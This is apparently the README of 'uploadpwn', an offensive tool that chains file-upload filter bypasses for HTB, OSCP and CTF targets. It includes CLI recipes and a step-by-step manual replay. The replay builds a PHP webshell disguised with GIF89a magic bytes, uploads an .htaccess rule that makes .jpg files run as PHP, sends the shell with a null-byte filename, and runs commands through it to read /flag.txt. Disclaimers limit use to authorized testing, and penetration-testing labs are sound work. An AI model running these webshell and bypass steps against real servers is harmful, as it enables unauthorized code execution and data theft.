# uploadpwn

**Universal File Upload Attack Tool — HTB / OSCP / CTF edition.**

`uploadpwn` chains every known file-upload bypass into one CLI: filter
fingerprinting, blacklist gaps, MIME / magic-byte spoofing, null-byte
truncation, `.htaccess` / `.user.ini` / `php.ini` re-routing, SVG XXE & XSS,
polyglot payloads, parser-confusion tricks, Nginx-specific quirks,
`web.config` for IIS, race conditions, ZIP / DoS, and login-aware
multi-step navigation. When something works, it confirms RCE, drops you
into an interactive shell, and writes a JSON audit log.

> Authorized testing only — HTB / labs / written pentest scope.
> The `--i-am-authorized` flag is required to suppress the warning; it is
> **not** a legal shield.

---

## Features

- **Filter fingerprinting** — probes Content-Type, MIME, extension,
  and size filters before spending payloads
- **Bypass chains** — folds CT-spoof + magic bytes + null byte +
  alt-extension into a single request when needed
- **`.htaccess` / `.user.ini` / `php.ini`** — 32 re-routing tricks
  (`AddType`, `AddHandler`, `SetHandler`, `FilesMatch`, `ForceType`,
  `auto_prepend_file`, etc.)
- **SVG attack surface** — XXE file-read (`--svg-read`), source
  disclosure (`--svg-src`), stored XSS, SSRF
- **Polyglots** — real GIF / PNG / JPEG that are also valid PHP
- **Parser confusion** — multi-extension, trailing chars, NTFS ADS,
  case tricks
- **Nginx tricks** — `*.jpg/.php`, off-by-slash, alias misconfigs
- **IIS `web.config`** — handler injection for ASPX execution
- **Race conditions** — TOCTOU upload/scan races
- **Auth-aware** — multi-step login, CSRF auto-detect, OTP / TOTP,
  Basic / Digest / NTLM / Bearer / API-key / mTLS, JSON-SPA login,
  session cookie injection, JS-heavy login via Selenium
- **Endpoint discovery** — crawls the app to find every upload form
  (`--discover`, `--discover-only`, `--attack-all`)
- **Interactive webshell** — drop straight to a shell on RCE
  (`--interactive`)
- **`--cleanup`** — removes every artifact recorded in the report
- **`--explain`** — *new:* renders the exact curl commands that
  reproduced the chain on **this** target, for manual reproduction
  / writeups / handoff

---

## Install

```bash
git clone https://github.com/<you>/uploadpwn.git
cd uploadpwn
pip install requests beautifulsoup4 lxml pyotp        # core
pip install selenium requests-ntlm                    # optional auth modes
```

Python 3.8+. Tested on Kali rolling.

---

## Quick start

```bash
# Basic — no login, auto-detect everything
python3 uploadpwn.py -t http://10.10.10.10 --i-am-authorized

# Known endpoint + field name
python3 uploadpwn.py -t http://10.10.10.10 \
  -e /Ticket.php --field the_file \
  --htaccess --i-am-authorized

# Login flow (CSRF + form fields auto-detected)
python3 uploadpwn.py -t http://10.10.10.10 \
  --login /login.php --user admin --pass admin \
  --i-am-authorized

# Login → navigate → upload page
python3 uploadpwn.py -t http://10.10.10.10 \
  --login /login.php --user admin --pass admin \
  --nav /dashboard --upload-page /profile/settings/avatar \
  --field profile_pic --i-am-authorized

# Existing session cookie (grabbed from Burp)
python3 uploadpwn.py -t http://10.10.10.10 \
  --cookie "PHPSESSID=abc123def456" --i-am-authorized

# JS-heavy login (React / Angular / Vue)
python3 uploadpwn.py -t http://10.10.10.10 \
  --login /login --user admin --pass admin \
  --login-method selenium --i-am-authorized

# SVG XXE — read flag directly (no RCE required)
python3 uploadpwn.py -t http://10.10.10.10 \
  --svg-read /flag.txt --i-am-authorized

# Read PHP source to find hidden upload dir
python3 uploadpwn.py -t http://10.10.10.10 \
  --svg-src upload.php --i-am-authorized

# Drop into interactive webshell on RCE
python3 uploadpwn.py -t http://10.10.10.10 \
  --interactive --i-am-authorized

# Run absolutely everything
python3 uploadpwn.py -t http://10.10.10.10 \
  --all --interactive -v --i-am-authorized
```

---

## Manual replay (`--explain`)

Every run writes `uploadpwn_report.json`. Pass `--explain` (or
`--explain-report PATH` offline) and the tool prints the exact `curl`
commands that reproduce the captured chain against **this specific
target** — useful for writeups, OSCP-style notes, or handing off a
finding to a teammate without the automation.

```bash
# After a run
python3 uploadpwn.py -t http://10.10.10.10 -e /Ticket.php \
  --field the_file --htaccess --explain --i-am-authorized

# Or render an old report offline (no target, no network)
python3 uploadpwn.py --explain-report uploadpwn_report.json
```

Example output (real Ticket.php run):

```
═══════════════════════════════════════════════════════════════════
  MANUAL REPLAY — http://192.168.134.187
═══════════════════════════════════════════════════════════════════

  Upload endpoint : http://192.168.134.187/Ticket.php
  Upload field    : the_file
  Cmd param       : cmd

─── Step 1 — Build the shell payload ──────────────────────────────
  # GIF89a magic bytes — bypasses MIME sniff
  printf 'GIF89a;\n<?php system($_GET["cmd"]); ?>\n' > shell.jpg

─── Step 2 — .htaccess — re-route via 'addtype_jpg' ───────────────
  cat > .htaccess <<'EOF'
  AddType application/x-httpd-php .jpg
  EOF
  curl -F 'the_file=@.htaccess;type=text/plain' \
       http://192.168.134.187/Ticket.php

─── Step 3 — Upload the shell ─────────────────────────────────────
  # Filters bypassed: Content-Type (spoof to image/jpeg),
  #                   MIME (GIF89a magic bytes),
  #                   Extension (null byte: shell.php%00.jpg)
  curl -F $'the_file=@shell.jpg;filename=shell.php\x00.jpg;type=image/jpeg' \
       http://192.168.134.187/Ticket.php

─── Step 4 — Trigger the RCE ──────────────────────────────────────
  curl 'http://192.168.134.187/uploads/shell.jpg?cmd=id'
  curl 'http://192.168.134.187/uploads/shell.jpg?cmd=cat+/flag.txt'
```

See [`MANUAL_GUIDE.md`](MANUAL_GUIDE.md) for the full generic cheatsheet
(every technique, decision tree, and report-event → manual-section
mapping).

---

## Flag reference

### Target / endpoint
| Flag | Description |
|------|-------------|
| `-t, --target URL` | Target base URL (required unless `-r`) |
| `-r, --request FILE` | Burp / raw HTTP request file (sqlmap-style) |
| `--https` | Force HTTPS when using `-r` |
| `-e, --endpoint PATH` | Upload endpoint (auto-detected if omitted) |
| `--field NAME` | Upload field name (auto-detected if omitted) |
| `--extra-field NAME=VALUE` | Extra multipart field on every upload (repeatable) |
| `--shell-dirs PATH ...` | Candidate directories for the uploaded shell |
| `--cmd-param NAME` | Shell command parameter (default: `cmd`) |
| `--flag PATH` | File to read after RCE (default: `/flag.txt`) |

### Authentication
| Flag | Description |
|------|-------------|
| `--login PATH` | Login page |
| `--user / --pass` | Credentials |
| `--user-field / --pass-field` | Override form field names |
| `--login-method {auto,requests,selenium}` | Login engine |
| `--nav PATH` | Navigate here after login |
| `--upload-page PATH` | Upload form lives here |
| `--cookie NAME=VALUE` | Inject cookie (repeatable) |
| `--header "Name: Value"` | Inject header (repeatable) |
| `--otp-value / --otp-totp-secret / --otp-prompt` | 2FA handling |
| `--basic-auth / --digest-auth / --ntlm-auth USER:PASS` | HTTP-level auth |
| `--bearer TOKEN` / `--api-key HDR:VAL` | Token-based auth |
| `--cert PATH[,KEY]` | Client cert (mTLS) |
| `--json-login URL --token-path JSON.PATH` | SPA / API login |

### Transport / pacing
| Flag | Description |
|------|-------------|
| `--proxy URL` | HTTP proxy (e.g. Burp) |
| `-k, --insecure` | Disable TLS verification |
| `--ca-bundle PATH` | Custom CA |
| `--timeout / --retry / --backoff` | HTTP behavior |
| `--delay / --jitter` | Request pacing |
| `--rate-limit RPS` | Cap throughput |
| `--request-budget N` | Hard cap on requests (default 5000) |
| `--waf-pause SEC` | Sleep on WAF detection |
| `--threads N` | Parallel modules |

### Attack modules
| Flag | Description |
|------|-------------|
| `--all` | Enable every module |
| `--matrix` | Filter-fingerprint matrix |
| `--htaccess` | `.htaccess` / `.user.ini` / `php.ini` (32 tricks) |
| `--polyglots` | Image-format polyglots |
| `--parser-confusion` | Multi-ext / case / trailing chars |
| `--nginx-tricks` | Nginx-specific bypasses |
| `--webconfig` | IIS `web.config` |
| `--svg-read PATH` | SVG XXE: read a file |
| `--svg-src FILE` | SVG XXE: read PHP source (base64) |
| `--svg-xss` / `--svg-ssrf URL` | SVG XSS / SSRF |
| `--race` | TOCTOU race-condition |
| `--zip` | ZIP-based tricks |
| `--dos` | Size / decompression DoS |
| `--discover[-only]` | Crawl for upload endpoints |
| `--attack-all` | Hit every discovered endpoint |
| `--exhaust` | Try every payload, even after RCE |

### Output / safety
| Flag | Description |
|------|-------------|
| `-o, --output FILE` | JSON report path (default `uploadpwn_report.json`) |
| `--interactive` | Interactive shell on RCE |
| `--cleanup` | Remove artifacts recorded in the report |
| `--explain` | Print manual-replay curls after the run |
| `--explain-report PATH` | Print manual-replay from an old JSON and exit |
| `--i-am-authorized` | Required to suppress the authorization notice |
| `-v, --verbose` | Verbose logging |

---

## Report format

Every run writes `uploadpwn_report.json`:

```json
{
  "tool": "uploadpwn",
  "version": "5.0.0",
  "target": "http://...",
  "upload_field": "the_file",
  "cmd_param": "cmd",
  "filters":   { "Content-Type Filter": "bypassed", ... },
  "rce":       [ { "file": "shell.jpg", "url": "...", "shell": "standard" } ],
  "steps":     [ { "ts": "...", "category": "filter", "status": "bypassed", ... } ],
  "artifacts": [ { "url": "...", "filename": ".htaccess", "type": "htaccess" } ],
  "outcomes":  { "RCE_CONFIRMED": 1, "FILTER_BYPASSED": 4, ... }
}
```

The `steps` array is what `--explain` parses to reconstruct the
manual chain.

---

## Files

| File | Purpose |
|------|---------|
| `uploadpwn.py` | Main tool |
| `uploadpwnAI.py` | Experimental LLM-assisted variant |
| `polyglots.py` | Prebuilt image/PHP polyglot payloads |
| `MANUAL_GUIDE.md` | Manual reproduction cheatsheet (every technique) |
| `AI_CHECKLIST.md` | Internal checklist for the AI module |
| `IMPROVEMENTS.md` | Roadmap / change notes |
| `tests/` | Unit + integration tests |

---

## Legal

Use only against systems you are authorized to test. CTF / HTB / lab
environments and engagements with written scope are the intended use.
You are responsible for staying inside that scope.

## License

MIT.
